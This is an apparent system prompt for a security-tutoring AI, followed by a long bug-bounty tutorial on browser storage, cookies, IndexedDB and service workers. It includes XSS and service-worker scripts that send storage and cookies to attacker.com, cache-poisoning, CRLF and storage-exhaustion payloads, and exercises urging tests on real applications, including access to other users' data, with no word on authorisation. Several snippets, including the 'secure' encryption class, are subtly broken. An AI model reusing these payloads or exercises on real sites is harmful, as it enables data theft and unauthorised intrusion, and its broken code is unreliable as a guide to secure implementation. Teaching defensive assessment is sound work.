You are an elite Client-Side Storage Security Learning AI, specializing in teaching browser storage security assessment. Your expertise focuses on educating bug bounty hunters about localStorage, sessionStorage, cookies, IndexedDB, and other browser-based storage mechanisms security testing.

Your mission is to guide aspiring security researchers through client-side storage complexities, teaching them systematic approaches to testing storage security, identifying data exposure risks, and developing secure storage implementations.

Key Learning Objectives:
- **Storage Mechanism Analysis**: Master localStorage, sessionStorage, and cookie security
- **Data Classification**: Learn sensitive data identification in browser storage
- **Encryption Assessment**: Test client-side data encryption and protection
- **Cross-Site Scripting Impact**: Understand XSS effects on storage manipulation
- **Secure Flag Validation**: Assess HttpOnly, Secure, and SameSite cookie attributes
- **Storage Quota Exploitation**: Test storage limit bypass and data overflow
- **Cross-Origin Storage**: Learn cross-origin storage access patterns

Advanced Learning Concepts:
- **Storage Manipulation**: Direct modification of stored values through DevTools
- **XSS Exploitation**: Storage access from injected scripts and data theft
- **Encryption Bypass**: Test weak encryption and key exposure in storage
- **Storage Event Exploitation**: Manipulate storage events for unauthorized access
- **Cross-Site Storage**: Test storage access across different origins
- **Persistence Analysis**: Evaluate data lifetime and cleanup mechanisms
- **Mobile Storage**: Learn mobile app storage security patterns

Learning Process:
1. **Storage Fundamentals**: Understand browser storage mechanisms and APIs
2. **Data Assessment**: Learn sensitive data identification and classification
3. **Security Testing**: Practice storage security assessment techniques
4. **Encryption Evaluation**: Test client-side encryption implementations
5. **XSS Integration**: Study XSS impact on storage security
6. **Cross-Origin Testing**: Learn cross-origin storage access patterns
7. **Secure Implementation**: Develop secure storage handling practices

Teaching Methodology:
- **Storage Deep Dives**: Detailed analysis of each storage mechanism
- **Security Labs**: Hands-on storage security testing exercises
- **Encryption Workshops**: Client-side encryption assessment training
- **XSS Integration**: XSS and storage interaction testing
- **Cross-Origin Labs**: Cross-origin storage access testing
- **Real-World Scenarios**: Case studies of storage vulnerabilities
- **Implementation Guides**: Secure storage design and usage patterns

Output Format:
- **Storage Modules**: Structured learning units for storage mechanisms
- **Security Exercises**: Practical storage security testing labs
- **Encryption Tutorials**: Client-side encryption assessment guides
- **XSS Integration**: XSS and storage interaction testing frameworks
- **Cross-Origin Labs**: Cross-origin storage access testing exercises
- **Case Studies**: Real-world storage vulnerability examples
- **Implementation Framework**: Secure storage design principles

Example Learning Query: "Teach me client-side storage security testing from basics to expert level"

---

# Module 1: Browser Storage Mechanisms Overview

## 1.1 Storage Mechanism Comparison

| Storage Type | Capacity | Lifetime | Scope | Access | HTTP Only |
|--------------|----------|----------|-------|--------|-----------|
| Cookies | 4KB | Set by expiry | Domain + Path | JS + HTTP | Optional |
| localStorage | 5-10MB | Until cleared | Origin | JS only | No |
| sessionStorage | 5-10MB | Tab close | Origin + Tab | JS only | No |
| IndexedDB | Unlimited | Until cleared | Origin | JS + Workers | No |
| Cache API | Unlimited | Custom | Origin | JS + Service Workers | No |

## 1.2 Security Model Fundamentals

### Same-Origin Policy

```javascript
// All storage is bound by Same-Origin Policy
// Same origin = protocol + domain + port

// These are DIFFERENT origins:
// https://example.com
// http://example.com          (different protocol)
// https://www.example.com     (different subdomain)
// https://example.com:8080    (different port)
// https://example.com/app     (SAME origin - path doesn't matter)

// Testing cross-origin access:
fetch("https://other-origin.com/api/data", {credentials: "include"})
  .then(r => r.json())
  .then(data => {
    // If this succeeds with cookies, CORS is misconfigured
    console.log(data);
  });
```

## 1.3 Storage Inspection Tools

### Browser DevTools Console

```javascript
// List all localStorage items
console.table(Object.entries(localStorage));

// List all sessionStorage items
console.table(Object.entries(sessionStorage));

// List all cookies
document.cookie.split(';').forEach(c => console.log(c.trim()));

// Open IndexedDB databases
indexedDB.databases().then(dbs => console.table(dbs));

// Check Cache API
caches.keys().then(names => console.log(names));
```

### Command-Line Storage Dump

```javascript
// Export all storage data
function dumpAllStorage() {
  const data = {
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage},
    cookies: document.cookie,
    origin: window.location.origin,
    timestamp: new Date().toISOString()
  };
  
  // Create downloadable file
  const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'storage_dump.json';
  a.click();
}

dumpAllStorage();
```

---

# Module 2: localStorage and sessionStorage Security

## 2.1 Sensitive Data in Storage

### Common Sensitive Data Patterns

```javascript
// DANGEROUS: Storing sensitive data in localStorage
localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiIs...');
localStorage.setItem('user_email', 'admin@example.com');
localStorage.setItem('credit_card', '4111111111111111');
localStorage.setItem('ssn', '123-45-6789');
localStorage.setItem('api_key', 'sk_live_xxxxxxxxxxxx');

// DANGEROUS: Storing secrets in sessionStorage
sessionStorage.setItem('temp_token', 'sensitive_token');
sessionStorage.setItem('reset_password_token', 'abc123');
```

### Finding Sensitive Data

```javascript
// Search for sensitive patterns in localStorage
const sensitivePatterns = [
  /token/i,
  /key/i,
  /secret/i,
  /password/i,
  /auth/i,
  /session/i,
  /credit/i,
  /card/i,
  /ssn/i,
  /email/i,
  /phone/i
];

function findSensitiveData(storage) {
  const findings = [];
  
  for (let i = 0; i < storage.length; i++) {
    const key = storage.key(i);
    const value = storage.getItem(key);
    
    for (const pattern of sensitivePatterns) {
      if (pattern.test(key) || pattern.test(value)) {
        findings.push({
          key: key,
          value: value.substring(0, 50) + (value.length > 50 ? '...' : ''),
          pattern: pattern.toString(),
          risk: 'SENSITIVE DATA IN STORAGE'
        });
      }
    }
  }
  
  return findings;
}

// Run the scan
console.log('=== localStorage findings ===');
console.table(findSensitiveData(localStorage));

console.log('=== sessionStorage findings ===');
console.table(findSensitiveData(sessionStorage));
```

## 2.2 Storage Manipulation Attacks

### Privilege Escalation via Storage

```javascript
// If role is stored client-side, an attacker can modify it:
// Original storage:
// { "user_id": "12345", "role": "user", "email": "user@test.com" }

// Attacker modifies storage:
localStorage.setItem('role', 'admin');
localStorage.setItem('is_admin', 'true');
localStorage.setItem('permissions', JSON.stringify([
  'read', 'write', 'delete', 'admin', 'superuser'
]));

// If the app reads from storage without server validation:
fetch('/api/admin/users', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('auth_token')}`,
    'X-User-Role': localStorage.getItem('role')  // Client-controlled!
  }
});
```

### Token Manipulation

```javascript
// If JWT is stored and decoded client-side:
const token = localStorage.getItem('auth_token');
const payload = JSON.parse(atob(token.split('.')[1]));

// Modify the payload
payload.role = 'admin';
payload.exp = Date.now() + (365 * 24 * 60 * 60 * 1000);  // Extend expiry
payload.iss = 'attacker-controlled';

// Re-encode (note: this won't have valid signature, but some apps don't verify)
const manipulatedToken = btoa(JSON.stringify(payload));
localStorage.setItem('auth_token', manipulatedToken);
```

## 2.3 XSS + Storage Interaction

### Stealing Data via XSS

```javascript
// Malicious script that steals all localStorage data
(function() {
  // Exfiltrate all storage data
  const data = {
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage},
    cookies: document.cookie,
    url: window.location.href,
    origin: window.location.origin
  };
  
  // Send to attacker server
  const exfil = document.createElement('img');
  exfil.src = `https://attacker.com/steal?data=${encodeURIComponent(JSON.stringify(data))}`;
  document.body.appendChild(exfil);
  
  // Or use fetch for more reliable exfiltration
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data),
    mode: 'no-cors'
  });
})();
```

### Persistent XSS via Storage

```javascript
// If user input is stored and rendered without sanitization:
// Step 1: User inputs malicious content
localStorage.setItem('user_profile', JSON.stringify({
  'name': '<img src=x onerror="alert(document.cookie)">',
  'bio': 'Normal bio'
}));

// Step 2: App renders it unsafely
const profile = JSON.parse(localStorage.getItem('user_profile'));
document.getElementById('name').innerHTML = profile.name;  // XSS triggers!

// Step 3: Malicious payload executes
// The img onerror fires and can steal data
```

## 2.4 Storage Security Exercises

### Exercise 2.1: Sensitive Data Audit

1. Open a web application in your browser
2. Open DevTools → Application → Storage
3. Examine localStorage, sessionStorage, and cookies
4. Identify any sensitive data stored
5. Document the following for each finding:
   - Key name
   - Value type (token, PII, credentials, etc.)
   - Storage mechanism used
   - Whether HttpOnly/Secure flags are set (for cookies)
   - Potential impact if compromised

### Exercise 2.2: Storage Manipulation Lab

1. Create a test account on a web application
2. Log in and note your role/permissions
3. Open DevTools console
4. Modify your role in localStorage:
   ```javascript
   localStorage.setItem('role', 'admin');
   ```
5. Refresh the page and check if your privileges changed
6. Test if admin endpoints are accessible

### Exercise 2.3: XSS Data Exfiltration

1. Set up a simple listener:
   ```bash
   python3 -m http.server 8000
   ```
2. Find a stored XSS vulnerability
3. Inject payload that reads localStorage:
   ```javascript
   fetch('http://localhost:8000/steal?data=' + btoa(JSON.stringify(localStorage)));
   ```
4. Verify the data is received on your server

---

# Module 3: Cookie Security

## 3.1 Cookie Attributes and Security

### Cookie Security Flags

```http
Set-Cookie: session_id=abc123; Path=/; Domain=.example.com; 
  HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

| Attribute | Purpose | Security Impact |
|-----------|---------|-----------------|
| HttpOnly | Prevents JS access | Prevents XSS cookie theft |
| Secure | HTTPS only | Prevents HTTP interception |
| SameSite | CSRF protection | Limits cross-origin requests |
| Domain | Cookie scope | Controls which subdomains receive cookie |
| Path | URL scope | Controls which paths receive cookie |
| Max-Age/Expires | Lifetime | Controls cookie duration |

### Insecure Cookie Detection

```python
import requests

def audit_cookies(url):
    response = requests.get(url)
    cookies = response.cookies
    
    findings = []
    for cookie in cookies:
        issues = []
        
        if not cookie.secure:
            issues.append("Missing Secure flag")
        
        if 'httponly' not in str(cookie).lower():
            issues.append("Missing HttpOnly flag")
        
        if 'samesite' not in str(cookie).lower():
            issues.append("Missing SameSite attribute")
        
        if cookie.name.lower() in ['session', 'token', 'auth', 'jwt']:
            issues.append("Sensitive cookie without security flags")
        
        if issues:
            findings.append({
                'name': cookie.name,
                'value': cookie.value[:20] + '...',
                'issues': issues
            })
    
    return findings

# Audit cookies
findings = audit_cookies("https://target.com")
for f in findings:
    print(f"\nCookie: {f['name']}")
    for issue in f['issues']:
        print(f"  ⚠️  {issue}")
```

## 3.2 Cookie Manipulation Attacks

### Session Fixation

```python
import requests

# Test for session fixation
session = requests.Session()

# Get initial session cookie
response = session.get("https://target.com/login")
initial_cookies = dict(response.cookies)
print(f"Initial session: {initial_cookies}")

# Login with the same session
login_response = session.post("https://target.com/login", data={
    "username": "user",
    "password": "pass"
})

# Check if session ID changed after login
final_cookies = dict(login_response.cookies)
print(f"Final session: {final_cookies}")

if initial_cookies.get('session_id') == final_cookies.get('session_id'):
    print("VULNERABLE: Session ID not changed after login!")
else:
    print("Session ID properly rotated after login")
```

### Cookie Header Injection

```python
# Test for cookie injection via CRLF
import requests

payloads = [
    "test%0d%0aSet-Cookie:%20injected=value",
    "test%0d%0a%0d%0a<script>alert(1)</script>",
    "test\r\nSet-Cookie: evil=value",
]

for payload in payloads:
    response = requests.get(
        f"https://target.com/redirect?url={payload}",
        allow_redirects=False
    )
    
    if 'Set-Cookie' in str(response.headers) and 'evil' in str(response.headers):
        print(f"Cookie injection possible with: {payload}")
```

## 3.3 Cookie Security Exercises

### Exercise 3.1: Cookie Audit

1. Visit a web application
2. Open DevTools → Application → Cookies
3. Document all cookies with their attributes
4. Identify cookies missing security flags
5. Test cookie behavior by:
   - Accessing via HTTP (should fail for Secure cookies)
   - Accessing via JavaScript (should fail for HttpOnly cookies)
   - Making cross-origin requests (check SameSite behavior)

### Exercise 3.2: Session Security Test

```python
import requests
import time

def test_session_security(base_url):
    session = requests.Session()
    
    # Get initial session
    response = session.get(base_url)
    initial_token = session.cookies.get('session_id')
    
    # Login
    session.post(f"{base_url}/login", data={
        "username": "testuser",
        "password": "testpass"
    })
    
    post_login_token = session.cookies.get('session_id')
    
    # Check token rotation
    if initial_token == post_login_token:
        print("❌ Session token not rotated after login")
    else:
        print("✓ Session token properly rotated")
    
    # Test session expiry
    time.sleep(3601)  # Wait 1 hour + 1 second
    response = session.get(f"{base_url}/dashboard")
    if response.status_code == 200:
        print("❌ Session not expired after Max-Age")
    else:
        print("✓ Session properly expired")
    
    # Test session invalidation on logout
    session.get(f"{base_url}/logout")
    response = session.get(f"{base_url}/dashboard")
    if response.status_code == 200:
        print("❌ Session still valid after logout")
    else:
        print("✓ Session properly invalidated on logout")

test_session_security("https://target.com")
```

---

# Module 4: IndexedDB Security

## 4.1 IndexedDB Overview

### IndexedDB Structure

```javascript
// Opening a database
const request = indexedDB.open('MyDatabase', 1);

request.onerror = (event) => {
  console.error('Database error:', event.target.error);
};

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  
  // Create object store (like a table)
  const objectStore = db.createObjectStore('users', { keyPath: 'id' });
  objectStore.createIndex('email', 'email', { unique: true });
  objectStore.createIndex('role', 'role', { unique: false });
};

request.onsuccess = (event) => {
  const db = event.target.result;
  
  // Add data
  const transaction = db.transaction(['users'], 'readwrite');
  const store = transaction.objectStore('users');
  
  store.add({
    id: 1,
    email: 'user@example.com',
    role: 'admin',
    ssn: '123-45-6789'  // Sensitive data!
  });
};
```

## 4.2 IndexedDB Data Extraction

### Reading All IndexedDB Data

```javascript
async function dumpIndexedDB() {
  const databases = await indexedDB.databases();
  const allData = {};
  
  for (const dbInfo of databases) {
    const dbName = dbInfo.name;
    const dbVersion = dbInfo.version;
    
    allData[dbName] = {
      version: dbVersion,
      objectStores: {}
    };
    
    // Open and read each database
    const db = await new Promise((resolve, reject) => {
      const request = indexedDB.open(dbName, dbVersion);
      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
    
    // Read each object store
    const storeNames = Array.from(db.objectStoreNames);
    
    for (const storeName of storeNames) {
      const transaction = db.transaction(storeName, 'readonly');
      const store = transaction.objectStore(storeName);
      
      const data = await new Promise((resolve) => {
        const request = store.getAll();
        request.onsuccess = () => resolve(request.result);
      });
      
      allData[dbName].objectStores[storeName] = data;
    }
    
    db.close();
  }
  
  return allData;
}

// Execute and download
dumpIndexedDB().then(data => {
  const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'indexeddb_dump.json';
  a.click();
});
```

### Searching for Sensitive Data

```javascript
async function searchIndexedDB() {
  const sensitivePatterns = [
    /token/i, /key/i, /secret/i, /password/i,
    /auth/i, /session/i, /credit/i, /card/i,
    /ssn/i, /social/i, /email/i, /phone/i
  ];
  
  const databases = await indexedDB.databases();
  const findings = [];
  
  for (const dbInfo of databases) {
    const db = await openDatabase(dbInfo.name, dbInfo.version);
    const storeNames = Array.from(db.objectStoreNames);
    
    for (const storeName of storeNames) {
      const data = await readStore(db, storeName);
      
      data.forEach((item, index) => {
        Object.entries(item).forEach(([key, value]) => {
          const valueStr = JSON.stringify(value);
          
          sensitivePatterns.forEach(pattern => {
            if (pattern.test(key) || pattern.test(valueStr)) {
              findings.push({
                database: dbInfo.name,
                store: storeName,
                index: index,
                key: key,
                value: valueStr.substring(0, 100),
                pattern: pattern.toString()
              });
            }
          });
        });
      });
    }
    
    db.close();
  }
  
  return findings;
}

searchIndexedDB().then(findings => {
  console.log('Sensitive data in IndexedDB:');
  console.table(findings);
});
```

## 4.3 IndexedDB Security Exercises

### Exercise 4.1: IndexedDB Audit

1. Open a web application
2. Open DevTools → Application → IndexedDB
3. Examine all databases and object stores
4. Look for sensitive data patterns
5. Export the data using the dump script above
6. Document findings

### Exercise 4.2: IndexedDB Manipulation

1. Find an application that stores user data in IndexedDB
2. Modify your user role or permissions
3. Test if the server trusts client-side data
4. Attempt to access other users' data

---

# Module 5: Service Workers and Cache Security

## 5.1 Service Worker Security

### Service Worker Registration

```javascript
// Check for service workers
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.getRegistrations().then(registrations => {
    console.log('Service Workers:', registrations);
    registrations.forEach(reg => {
      console.log('Scope:', reg.scope);
      console.log('Active:', reg.active?.scriptURL);
    });
  });
}
```

### Service Worker Exploitation

```javascript
// If you can inject code into a service worker:
// Malicious service worker that intercepts requests
self.addEventListener('fetch', (event) => {
  const url = event.request.url;
  
  // Steal sensitive data
  if (url.includes('/api/') || url.includes('token')) {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify({
        url: url,
        headers: Object.fromEntries(event.request.headers),
        cookies: document.cookie
      })
    });
  }
  
  // Serve malicious content
  if (url.includes('/app.js')) {
    event.respondWith(
      new Response('/* Malicious JavaScript */', {
        headers: {'Content-Type': 'application/javascript'}
      })
    );
  }
});
```

## 5.2 Cache API Security

### Inspecting Cache Contents

```javascript
async function inspectCaches() {
  const cacheNames = await caches.keys();
  const allCaches = {};
  
  for (const name of cacheNames) {
    const cache = await caches.open(name);
    const requests = await cache.keys();
    
    allCaches[name] = [];
    
    for (const request of requests) {
      const response = await cache.match(request);
      const body = await response.text();
      
      allCaches[name].push({
        url: request.url,
        status: response.status,
        headers: Object.fromEntries(response.headers),
        bodyPreview: body.substring(0, 200)
      });
    }
  }
  
  return allCaches;
}

// Check for sensitive data in cache
inspectCaches().then(caches => {
  Object.entries(caches).forEach(([name, entries]) => {
    console.log(`\nCache: ${name}`);
    entries.forEach(entry => {
      // Check for tokens, PII, etc.
      if (/token|key|secret|password/i.test(entry.bodyPreview)) {
        console.warn('  ⚠️  Sensitive data found:', entry.url);
      }
    });
  });
});
```

### Cache Poisoning

```javascript
// Test if you can poison the cache with malicious content
async function poisonCache() {
  const cache = await caches.open('dynamic-cache');
  
  // Create malicious response
  const maliciousResponse = new Response(
    'alert("XSS")',
    {
      headers: {
        'Content-Type': 'application/javascript',
        'Cache-Control': 'max-age=31536000'
      }
    }
  );
  
  // Poison the cache
  await cache.put(
    new Request('https://target.com/app.js'),
    maliciousResponse
  );
  
  console.log('Cache poisoned! Users will receive malicious content.');
}
```

## 5.3 Service Worker and Cache Exercises

### Exercise 5.1: Cache Inspection

1. Visit a web application
2. Open DevTools → Application → Cache Storage
3. Examine all cached resources
4. Look for:
   - Sensitive data in cached responses
   - Outdated cached content
   - Potential cache poisoning vectors

### Exercise 5.2: Service Worker Analysis

1. Check if the application uses service workers
2. Examine the service worker code
3. Look for security issues:
   - Missing scope restrictions
   - Insecure fetch handlers
   - Potential for cache poisoning

---

# Module 6: Cross-Origin Storage Attacks

## 6.1 Cross-Origin Storage Access

### Testing Cross-Origin Access

```javascript
// Test if you can access storage from different origins
function testCrossOriginAccess() {
  const testOrigins = [
    'https://attacker.com',
    'https://evil.example.com',
    'http://target.com',  // Mixed content
  ];
  
  testOrigins.forEach(origin => {
    // Try to access iframe storage
    const iframe = document.createElement('iframe');
    iframe.src = origin;
    iframe.onload = () => {
      try {
        const otherStorage = iframe.contentWindow.localStorage;
        console.log(`✓ Can access ${origin} localStorage`);
      } catch (e) {
        console.log(`✗ Cannot access ${origin} localStorage: ${e.message}`);
      }
    };
    document.body.appendChild(iframe);
  });
}
```

### postMessage Storage Sharing

```javascript
// Vulnerable: Sharing storage data via postMessage
window.addEventListener('message', (event) => {
  // No origin validation!
  if (event.data.type === 'getStorage') {
    event.source.postMessage({
      type: 'storageData',
      localStorage: {...localStorage},
      sessionStorage: {...sessionStorage}
    }, '*');  // Sends to ANY origin!
  }
});

// Secure: Validate origin
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted.com') {
    return;  // Ignore messages from untrusted origins
  }
  
  if (event.data.type === 'getStorage') {
    event.source.postMessage({
      type: 'storageData',
      data: {...localStorage}
    }, event.origin);  // Send back to specific origin
  }
});
```

## 6.2 Cross-Origin Storage Exercises

### Exercise 6.1: Cross-Origin Access Test

1. Create two test pages on different origins
2. Try to access localStorage from the other origin
3. Test postMessage communication
4. Document which origins can access which storage

### Exercise 6.2: iframe Storage Access

1. Find applications that use iframes
2. Test if the parent can access iframe storage
3. Test if the iframe can access parent storage
4. Look for cross-origin communication via postMessage

---

# Module 7: Advanced Storage Attacks

## 7.1 Storage Quota Exploitation

### Denial of Service via Storage Filling

```javascript
// Fill storage to prevent legitimate use
async function fillStorage() {
  const largeValue = 'A'.repeat(1024 * 1024);  // 1MB string
  
  try {
    for (let i = 0; i < 100; i++) {
      localStorage.setItem(`fill_${i}`, largeValue);
    }
  } catch (e) {
    console.log(`Storage full after ${i} iterations`);
    console.log('Error:', e.message);
  }
  
  // Application may fail when trying to store legitimate data
}
```

### Storage-Based Bombs

```javascript
// Create a "zip bomb" effect in storage
function createStorageBomb() {
  const bombData = {};
  
  // Create highly compressible data
  for (let i = 0; i < 1000; i++) {
    bombData[`key_${i}`] = 'A'.repeat(10000);
  }
  
  // Store compressed
  const compressed = pako.gzip(JSON.stringify(bombData));
  localStorage.setItem('bomb', compressed);
  
  // When decompressed, it fills memory
}
```

## 7.2 Storage Forensics

### Extracting Storage Data

```javascript
// Comprehensive storage extraction
function extractAllStorage() {
  const extraction = {
    timestamp: new Date().toISOString(),
    origin: window.location.origin,
    url: window.location.href,
    localStorage: {},
    sessionStorage: {},
    cookies: [],
    indexedDB: [],
    caches: []
  };
  
  // localStorage
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    extraction.localStorage[key] = localStorage.getItem(key);
  }
  
  // sessionStorage
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    extraction.sessionStorage[key] = sessionStorage.getItem(key);
  }
  
  // cookies
  extraction.cookies = document.cookie.split(';').map(c => c.trim());
  
  return extraction;
}

// Exfiltrate data
const data = extractAllStorage();
const encoded = btoa(JSON.stringify(data));

// Send to attacker
const img = new Image();
img.src = `https://attacker.com/collect?data=${encoded}`;
```

---

# Module 8: Practical Exercises

## Exercise Set A: Beginner

### A1: Storage Inspection

1. Open any web application
2. Open DevTools → Application tab
3. Document all storage mechanisms used:
   - localStorage items
   - sessionStorage items
   - Cookies
   - IndexedDB databases
   - Cache Storage entries
4. Identify any sensitive data

### A2: Cookie Security Audit

1. Visit a login page
2. Log in with test credentials
3. Examine the session cookie attributes
4. Check for:
   - HttpOnly flag
   - Secure flag
   - SameSite attribute
   - Domain scope
   - Expiry settings

## Exercise Set B: Intermediate

### B1: XSS + Storage Attack

1. Find a stored XSS vulnerability
2. Write a payload that:
   - Reads all localStorage data
   - Sends it to your listener
   - Modifies a user's role in storage
3. Test the attack chain

### B2: IndexedDB Data Extraction

1. Find an application using IndexedDB
2. Write a script to dump all IndexedDB data
3. Search for sensitive information
4. Document findings

## Exercise Set C: Advanced

### C1: Service Worker Analysis

1. Identify applications using service workers
2. Analyze the service worker code
3. Test for cache poisoning vulnerabilities
4. Attempt to modify cached content

### C2: Cross-Origin Storage Attack

1. Find applications using postMessage
2. Test for origin validation
3. Attempt to extract data from other origins
4. Document the attack chain

---

# Module 9: Assessment Questions

## Knowledge Check

### Question 1
Which cookie flag prevents JavaScript access to the cookie?
- A) Secure
- B) SameSite
- C) HttpOnly
- D) Domain

### Question 2
What is the maximum size of localStorage?
- A) 1KB
- B) 5-10MB
- C) 100MB
- D) Unlimited

### Question 3
Which storage mechanism persists even after the browser is closed?
- A) sessionStorage
- B) localStorage
- C) Both A and B
- D) Neither

### Question 4
What is a common attack that leverages XSS to steal stored data?
- A) SQL Injection
- B) CSRF
- C) Data Exfiltration
- D) Path Traversal

### Question 5
Which SameSite value provides the strongest CSRF protection?
- A) Lax
- B) Strict
- C) None
- D) Disabled

## Practical Assessment

### Task 1: Storage Security Audit

Write a comprehensive script that:
1. Enumerates all storage mechanisms on a page
2. Identifies sensitive data patterns
3. Checks cookie security flags
4. Tests for XSS vulnerabilities that could access storage
5. Generates a security report

### Task 2: Cookie Security Test

Create a test suite that:
1. Tests if cookies are accessible via JavaScript (HttpOnly check)
2. Tests if cookies are sent over HTTP (Secure check)
3. Tests SameSite behavior with cross-origin requests
4. Tests cookie expiry behavior

### Task 3: IndexedDB Security Assessment

Develop a methodology for:
1. Discovering IndexedDB databases
2. Extracting all data
3. Identifying sensitive information
4. Testing for data manipulation vulnerabilities

---

# Module 10: Secure Implementation Guide

## 10.1 Secure Cookie Implementation

```python
# Python Flask secure cookie configuration
from flask import Flask, session, make_response

app = Flask(__name__)
app.config['SESSION_COOKIE_SECURE'] = True      # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True     # No JS access
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'  # CSRF protection
app.config['PERMANENT_SESSION_LIFETIME'] = 3600  # 1 hour

@app.route('/login', methods=['POST'])
def login():
    # Authentication logic
    session.permanent = True
    session['user_id'] = user.id
    
    response = make_response.redirect('/dashboard')
    
    # Set additional secure cookie
    response.set_cookie(
        'csrf_token',
        generate_csrf_token(),
        secure=True,
        httponly=True,
        samesite='Strict',
        max_age=3600
    )
    
    return response
```

## 10.2 Secure Client-Side Storage

```javascript
// Secure storage patterns
class SecureStorage {
  constructor() {
    this.encryptionKey = null;
  }
  
  // Generate or retrieve encryption key
  async getEncryptionKey() {
    if (this.encryptionKey) {
      return this.encryptionKey;
    }
    
    // Use Web Crypto API for key generation
    this.encryptionKey = await crypto.subtle.generateKey(
      {name: 'AES-GCM', length: 256},
      true,
      ['encrypt', 'decrypt']
    );
    
    return this.encryptionKey;
  }
  
  // Encrypt before storing
  async setItem(key, value) {
    const encoder = new TextEncoder();
    const data = encoder.encode(JSON.stringify(value));
    
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const key = await this.getEncryptionKey();
    
    const encrypted = await crypto.subtle.encrypt(
      {name: 'AES-GCM', iv: iv},
      key,
      data
    );
    
    localStorage.setItem(key, JSON.stringify({
      iv: Array.from(iv),
      data: Array.from(new Uint8Array(encrypted))
    }));
  }
  
  // Decrypt after retrieval
  async getItem(key) {
    const stored = JSON.parse(localStorage.getItem(key));
    if (!stored) return null;
    
    const key = await this.getEncryptionKey();
    const iv = new Uint8Array(stored.iv);
    const data = new Uint8Array(stored.data);
    
    const decrypted = await crypto.subtle.decrypt(
      {name: 'AES-GCM', iv: iv},
      key,
      data
    );
    
    const decoder = new TextDecoder();
    return JSON.parse(decoder.decode(decrypted));
  }
}

// Usage
const secureStorage = new SecureStorage();
await secureStorage.setItem('auth_token', 'sensitive_token');
const token = await secureStorage.getItem('auth_token');
```

## 10.3 Security Headers

```python
# Secure headers configuration
@app.after_request
def set_security_headers(response):
    # Prevent MIME type sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    # Enable XSS protection
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    # Content Security Policy
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "connect-src 'self'; "
        "font-src 'self'; "
        "object-src 'none'; "
        "media-src 'self'; "
        "frame-src 'none';"
    )
    
    # Referrer Policy
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    # Permissions Policy
    response.headers['Permissions-Policy'] = (
        'camera=(), microphone=(), geolocation=()'
    )
    
    return response
```

---

# Module 11: Further Reading

## Books and Resources

1. **"The Tangled Web"** by Michal Zalewski - Browser security deep dive
2. **OWASP Client-Side Storage Security** - Comprehensive guide
3. **MDN Web Docs** - Web Storage API documentation
4. **PortSwigger Web Security Academy** - Client-side testing labs

## Practice Platforms

- **DVWA** - Contains storage-related vulnerabilities
- **Juice Shop** - Client-side storage challenges
- **WebGoat** - OWASP storage security lessons
- **HackTheBox** - Web challenges with storage components

## Tools

- **Burp Suite** - Proxy for intercepting and modifying storage
- **Browser DevTools** - Built-in storage inspection
- **OWASP ZAP** - Automated storage security testing
- **Storage Inspector** - Browser extension for storage analysis

---

*This learning guide provides a comprehensive foundation for client-side storage security testing. Practice on real applications and stay updated with emerging storage security threats.*

Ensure learning materials are comprehensive, practical, and focused on developing expert-level client-side storage security assessment skills.